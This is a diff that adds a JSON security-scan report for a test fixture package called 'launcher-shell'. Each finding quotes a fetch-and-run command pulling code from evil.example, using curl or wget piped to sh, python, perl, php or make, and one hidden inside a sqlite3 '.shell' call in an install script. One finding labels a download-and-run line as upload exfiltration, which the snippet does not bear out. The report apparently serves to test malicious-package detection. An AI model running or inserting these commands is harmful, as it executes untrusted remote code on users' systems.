@@ -1,0 +1,420 @@
+{
+  "package_name": "launcher-shell",
+  "package_version": "1.0.0-1",
+  "findings": [
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 17,
+        "column": 5,
+        "snippet": "    curl -fsSL https://evil.example/install.sh | busybox sh"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "curl -fsSL https://evil.example/install.sh | busybox sh"
+      }
+    },
+    {
+      "id": "DLE-002",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Wget pipe to shell",
+      "description": "Downloading and executing remote scripts via wget",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 31,
+        "column": 5,
+        "snippet": "    wget -qO- https://evil.example/stage2.sh | env -i sh"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "wget -qO- https://evil.example/stage2.sh | env -i sh"
+      }
+    },
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell (install script)",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 5,
+        "column": 5,
+        "snippet": "    curl -fsSL https://evil.example/postinstall.sh | /bin/sh"
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl -fsSL https://evil.example/postinstall.sh | /bin/sh"
+      }
+    },
+    {
+      "id": "DLE-001",
+      "severity": "critical",
+      "category": "command_injection",
+      "title": "Curl pipe to shell (install script)",
+      "description": "Downloading and executing remote scripts is extremely dangerous. Used in 2018 xeactor attack.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 7,
+        "column": 37,
+        "snippet": "    sqlite3 /var/lib/app.db \".shell curl -fsSL https://evil.example/s | sh\""
+      },
+      "recommendation": "Download scripts first, review them, then execute",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl -fsSL https://evil.example/s | sh"
+      }
+    },
+    {
+      "id": "INSTALL-003",
+      "severity": "critical",
+      "category": "network_security",
+      "title": "Network access in install script (install script)",
+      "description": "Install scripts should not make network connections",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 5,
+        "column": 5,
+        "snippet": "    curl -fsSL https://evil.example/postinstall.sh | /bin/sh"
+      },
+      "recommendation": "Install scripts should never download additional content",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl"
+      }
+    },
+    {
+      "id": "INSTALL-003",
+      "severity": "critical",
+      "category": "network_security",
+      "title": "Network access in install script (install script)",
+      "description": "Install scripts should not make network connections",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 7,
+        "column": 37,
+        "snippet": "    sqlite3 /var/lib/app.db \".shell curl -fsSL https://evil.example/s | sh\""
+      },
+      "recommendation": "Install scripts should never download additional content",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "curl"
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/install.sh",
+      "description": "This package downloads and executes code from https://evil.example/install.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 17,
+        "column": null,
+        "snippet": "curl -fsSL https://evil.example/install.sh | busybox sh"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/install.sh"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/y.py",
+      "description": "This package downloads and executes code from https://evil.example/y.py at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 19,
+        "column": null,
+        "snippet": "wget -qO- https://evil.example/y.py | /usr/bin/python -"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/y.py"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/p.py",
+      "description": "This package downloads and executes code from https://evil.example/p.py at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 21,
+        "column": null,
+        "snippet": "python3 <(curl -fsSL https://evil.example/p.py)"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/p.py"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/p.pl",
+      "description": "This package downloads and executes code from https://evil.example/p.pl at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 22,
+        "column": null,
+        "snippet": "perl -e \"$(curl -fsSL https://evil.example/p.pl)\""
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/p.pl"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/p.php",
+      "description": "This package downloads and executes code from https://evil.example/p.php at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 24,
+        "column": null,
+        "snippet": "php -r \"$(curl -fsSL https://evil.example/p.php)\""
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/p.php"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/stage2.sh",
+      "description": "This package downloads and executes code from https://evil.example/stage2.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 31,
+        "column": null,
+        "snippet": "wget -qO- https://evil.example/stage2.sh | env -i sh"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/stage2.sh"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/postinstall.sh (install script)",
+      "description": "This package downloads and executes code from https://evil.example/postinstall.sh at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 5,
+        "column": null,
+        "snippet": "curl -fsSL https://evil.example/postinstall.sh | /bin/sh"
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/postinstall.sh"
+        ]
+      }
+    },
+    {
+      "id": "EXEC-REMOTE",
+      "severity": "critical",
+      "category": "malicious_code",
+      "title": "Fetches and runs code from https://evil.example/s (install script)",
+      "description": "This package downloads and executes code from https://evil.example/s at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 7,
+        "column": null,
+        "snippet": "sqlite3 /var/lib/app.db \".shell curl -fsSL https://evil.example/s | sh\""
+      },
+      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
+      "cwe_id": "CWE-494",
+      "metadata": {
+        "opaque_boundary": true,
+        "remote_urls": [
+          "https://evil.example/s"
+        ]
+      }
+    },
+    {
+      "id": "EXFIL-006",
+      "severity": "high",
+      "category": "data_exfiltration",
+      "title": "HTTP upload exfiltration",
+      "description": "curl uploading a local file (-T/--upload-file/-F/--data-urlencode) — used to send harvested data to an attacker endpoint.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 26,
+        "column": 5,
+        "snippet": "    curl -fsSL https://evil.example/Makefile | make -f -"
+      },
+      "recommendation": "Verify what is being uploaded and to where.",
+      "cwe_id": "CWE-200",
+      "metadata": {
+        "matched_text": "curl -fsSL https://evil.example/Makefile | make -f "
+      }
+    },
+    {
+      "id": "EXEC-007",
+      "severity": "high",
+      "category": "command_injection",
+      "title": "make reads a Makefile from stdin",
+      "description": "`make -f -` / `make -f /dev/stdin` executes a Makefile fed on standard input (commonly the tail of a `curl ... | make -f -` fetch-and-run). A Makefile is arbitrary shell recipes, so this is RCE from an unverified source. Normal `make` / `make -f Makefile` builds are unaffected.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 26,
+        "column": 48,
+        "snippet": "    curl -fsSL https://evil.example/Makefile | make -f -"
+      },
+      "recommendation": "Review the Makefile source; building a Makefile read from stdin/a pipe runs unverified recipes.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "matched_text": "make -f -"
+      }
+    },
+    {
+      "id": "EXEC-006",
+      "severity": "high",
+      "category": "malicious_code",
+      "title": "sqlite3 shell-command execution (install script)",
+      "description": "sqlite3's `.shell`/`.system` dot-commands run an arbitrary shell command, and `.import` can read an attacker-controlled file — an exec/RCE vector hidden inside what looks like a database call. Legitimate packages do not drive sqlite3 through these meta-commands.",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/launcher-shell.install",
+        "line": 7,
+        "column": 5,
+        "snippet": "    sqlite3 /var/lib/app.db \".shell curl -fsSL https://evil.example/s | sh\""
+      },
+      "recommendation": "Do not build. sqlite3 .shell/.system run arbitrary commands; report the package.",
+      "cwe_id": "CWE-94",
+      "metadata": {
+        "in_install_script": true,
+        "matched_text": "sqlite3 /var/lib/app.db \".shell"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'package' contains network access command 'wget'",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 29,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "package",
+        "pattern": "wget"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'curl'",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 15,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "curl"
+      }
+    },
+    {
+      "id": "FUNC-001",
+      "severity": "high",
+      "category": "network_security",
+      "title": "Network access in build function",
+      "description": "Function 'build' contains network access command 'wget'",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": 15,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Network access should happen in source= array, not build functions",
+      "cwe_id": null,
+      "metadata": {
+        "function": "build",
+        "pattern": "wget"
+      }
+    },
+    {
+      "id": "SRC-005",
+      "severity": "medium",
+      "category": "configuration",
+      "title": "No sources with build function",
+      "description": "Package has build() function but no source array",
+      "location": {
+        "file": "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+        "line": null,
+        "column": null,
+        "snippet": null
+      },
+      "recommendation": "Verify this is intentional; build() usually needs sources",
+      "cwe_id": null,
+      "metadata": {}
+    }
+  ],
+  "scanned_files": [
+    "tests/fixtures/malicious/launcher-shell/PKGBUILD",
+    "tests/fixtures/malicious/launcher-shell/launcher-shell.install"
+  ],
+  "timestamp": "2026-06-15T10:43:30.623194197Z",
+  "scan_duration_ms": 6
+}
